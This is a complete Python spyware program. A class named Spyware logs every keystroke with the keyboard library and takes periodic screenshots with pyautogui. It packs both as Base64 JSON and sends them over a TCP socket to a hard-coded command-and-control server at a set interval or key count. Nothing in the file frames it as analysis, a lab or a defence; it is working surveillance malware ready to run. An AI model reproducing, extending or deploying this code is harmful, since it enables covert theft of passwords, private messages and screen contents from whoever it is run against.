import socket
import time
import json
import os
import base64
import io
import threading
import sys

# Try importing necessary libraries
try:
    import pyautogui
    HAS_PYAUTO = True
except ImportError:
    HAS_PYAUTO = False
    print("[-] pyautogui not found. Screenshots might fail without DISPLAY.")

try:
    import keyboard
    HAS_KEYBOARD = True
except ImportError:
    HAS_KEYBOARD = False
    print("[-] keyboard not found. Keylogging disabled.")

# --- CONFIGURATION ---
C2_SERVER_IP = "192.168.2.111"  # Apna C2 Server IP dalein
C2_SERVER_PORT = 5555

SEND_INTERVAL = 10  # Seconds between automatic data bursts
SCREENSHOT_INTERVAL = 5  # Increased to save bandwidth on Render
MAX_KEYS_BEFORE_SEND = 50  

class Spyware:
    def __init__(self):
        self.keys = []
        self.screenshots_b64 = []  # Store screenshots as Base64 strings instead of files
        self.last_send_time = time.time()
        self.last_screenshot_time = time.time()

        print(f"[+] Initializing Spyware...")
        print(f"    C2 Server: {C2_SERVER_IP}:{C2_SERVER_PORT}")
        
        # Hook keyboard in a separate thread to avoid blocking main loop
        if HAS_KEYBOARD:
            self.key_thread = threading.Thread(target=self.listen_keys, daemon=True)
            self.key_thread.start()

    def listen_keys(self):
        """Listener for keypress events."""
        try:
            keyboard.hook(self.on_key)
            # Keep the thread alive
            while True:
                time.sleep(1)
        except Exception as e:
            print(f"[-] Key listener error: {e}")

    def on_key(self, key):
        """Callback for keypress events."""
        try:
            k = str(key).replace("'", "")
            
            # Handle special keys
            if k == "Key.space":
                k = " "
            elif k == "Key.enter":
                k = "\\n"
            elif k == "Key.backspace":
                k = "[BS]"
            elif k == "Key.tab":
                k = "[TAB]"

            self.keys.append(k)
        except Exception as e:
            pass

    def take_screenshot(self):
        """Take a screenshot and convert to Base64 string."""
        try:
            if HAS_PYAUTO:
                # Take screenshot in memory (BytesIO)
                img = pyautogui.screenshot()
                buf = io.BytesIO()
                img.save(buf, format='PNG')
                byte_im = buf.getvalue()
                
                # Encode to Base64
                base64_str = base64.b64encode(byte_im).decode('utf-8')
                self.screenshots_b64.append(base64_str)
                print(f"[+] Screenshot captured (Base64 len: {len(base64_str)})")
            else:
                print("[-] Cannot take screenshot: pyautogui missing")
        except Exception as e:
            # Common error on Render is "Could not open display"
            if "Could not open display" in str(e):
                print(f"[-] Display issue (Headless mode?): {e}")
            else:
                print(f"[-] Error taking screenshot: {e}")

    def send_data(self):
        """Send collected keys and screenshot base64 to C2 via TCP Socket."""
        if not self.keys and not self.screenshots_b64:
            return

        payload = {
            "keys": self.keys,
            "screenshots": self.screenshots_b64
        }

        json_data = json.dumps(payload)
        data_bytes = json_data.encode('utf-8')

        try:
            # Create socket connection with timeout
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(10)  # Increased timeout for Render network latency
                s.connect((C2_SERVER_IP, C2_SERVER_PORT))

                # Send length of data first (4 bytes header)
                len_payload = len(data_bytes)
                s.sendall(len_payload.to_bytes(4, byteorder='big'))

                # Send the actual JSON data
                s.sendall(data_bytes)

            print(f"[+] Sent {len_payload} bytes to C2")

            # Clear buffer after successful send
            self.keys = []
            self.screenshots_b64 = []
            self.last_send_time = time.time()  # Reset timer

        except socket.timeout:
            print("[-] Connection timeout while sending data.")
        except Exception as e:
            print(f"[-] Failed to send data: {e}")

    def run(self):
        """Main execution loop."""
        try:
            while True:
                current_time = time.time()

                # Check if it's time for a screenshot
                if current_time - self.last_screenshot_time >= SCREENSHOT_INTERVAL:
                    self.take_screenshot()
                    self.last_screenshot_time = current_time

                # Check if it's time to send data (interval OR max keys reached)
                elif current_time - self.last_send_time >= SEND_INTERVAL or len(self.keys) >= MAX_KEYS_BEFORE_SEND:
                    self.send_data()

                time.sleep(1)  # Small sleep to prevent CPU spinning

        except KeyboardInterrupt:
            print("\n[-] Spyware stopped by user.")
            if HAS_KEYBOARD:
                keyboard.unhook_all()

if __name__ == "__main__":
    spy = Spyware()
    spy.run()
